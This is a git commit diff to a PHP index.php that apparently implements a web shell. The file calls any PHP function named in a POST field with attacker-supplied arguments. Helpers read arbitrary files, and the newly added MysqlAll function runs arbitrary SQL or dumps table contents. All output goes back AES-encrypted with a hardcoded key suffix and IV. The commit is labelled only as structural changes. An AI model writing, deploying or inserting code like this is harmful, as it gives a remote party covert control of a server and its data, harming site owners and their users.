0f1786789eecc667f8c1cd7f3fe849e233be3e8a
José Daniel <96458028+Tsurematsu@users.noreply.github.com>
2022-10-19 12:30:05 -0500

    Cambios Estructura

--- index.php
+++ index.php
@@ -2,7 +2,53 @@
 function encode ($valor, $pass) {$method = 'aes-256-cbc';$iv = base64_decode("C9fBxl1EWtYTL1/M8jfstw==");echo openssl_encrypt ($valor, $method, $pass.base64_encode("75913"), false, $iv);};
 function decode ($valor, $pass) {$method = 'aes-256-cbc';$iv = base64_decode("C9fBxl1EWtYTL1/M8jfstw==");echo base64_encode(openssl_decrypt($valor, $method, $pass.base64_encode("75913"), false, $iv));};
 function readFilePHP($nombre_fichero, $pass){$fichero_texto = fopen ($nombre_fichero, "r");$contenido_fichero = fread($fichero_texto, filesize($nombre_fichero));echo encode($contenido_fichero, $pass);}
-function Mysql($Consulta, $pass){}
+function MysqlAll($Consulta, $pass){
+    $keyloger = explode(",",explode(";",$Consulta)[0]);
+    $TextConsult = explode(";",$Consulta)[1];
+
+    // $conexion{} = mysqli_connect("localhost", "root", "", "test");
+    
+    $conexion = mysqli_connect("localhost", $keyloger[0], "", $keyloger[1]);
+
+    if ($TextConsult=="") {
+        $paramConsult = "SELECT * FROM prueba";
+        $consulta = mysqli_query($conexion, $paramConsult);
+        $resultado = "";
+        while ($dato = mysqli_fetch_assoc($consulta)) {
+            $paramConsult1 = "SHOW COLUMNS FROM prueba";
+            $consult = mysqli_query($conexion, $paramConsult1);
+            $res1="";
+            while ($subDato = mysqli_fetch_assoc($consult)) {
+                if ($res1 == "") {
+                    $res1 = $subDato["Field"] . ":" . $dato[$subDato["Field"]];
+                }else{
+                    $res1 = $res1  . ", " . $subDato["Field"] . ":" .  $dato[$subDato["Field"]];
+                }
+            }
+            if ($resultado == "") {
+                $resultado = $res1;
+            }else{
+                $resultado = $resultado . ";" .  $res1;
+            }
+            
+        }
+        echo encode($resultado, $pass);
+    }else{
+        try {
+            $paramConsult = $TextConsult;
+            $consulta = mysqli_query($conexion, $paramConsult);
+            while ($dato = mysqli_fetch_assoc($consulta)) {
+                
+            }
+            
+        } catch (\Throwable $th) {
+            echo encode($th, $pass);
+        }
+    }
+    
+    
+}
+
 if (isset($_POST['funct'])) {
     $func = $_POST['funct']; 
     $func(isset($_POST['param'])? base64_decode($_POST['param']):"", isset($_POST['password'])?$_POST['password']:"_");
